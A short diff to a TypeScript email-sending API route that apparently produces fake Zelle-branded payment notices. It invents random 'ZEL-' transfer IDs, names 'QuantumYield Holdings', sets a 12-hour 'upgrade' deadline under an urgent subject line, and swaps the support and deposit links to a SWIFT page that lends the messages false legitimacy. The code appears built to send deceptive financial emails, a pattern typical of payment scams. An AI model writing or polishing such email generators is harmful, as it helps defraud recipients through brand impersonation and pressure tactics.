@@ -25,7 +25,7 @@ export async function POST(request: Request) {
         recipientName,
         institution: "QuantumYield Holdings",
         upgradeDeadline: "within 12 hours",
-        supportLink: "https://support.zellepay.com",
+        supportLink: "https://www2.swift.com/mystandards/#/c/settlement-and-reconciliation",
       })
       emailSubject = "Important: Gateway Upgrade Required - Action Needed"
     } else {
@@ -39,7 +39,7 @@ export async function POST(request: Request) {
       }
 
       const transferId = `ZEL-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
-      const depositLink = `https://www.zellepay.com/`
+      const depositLink = `https://www2.swift.com/mystandards/#/c/settlement-and-reconciliation`
 
       emailHtml = generateZelleEmailHtml({
         recipientName,
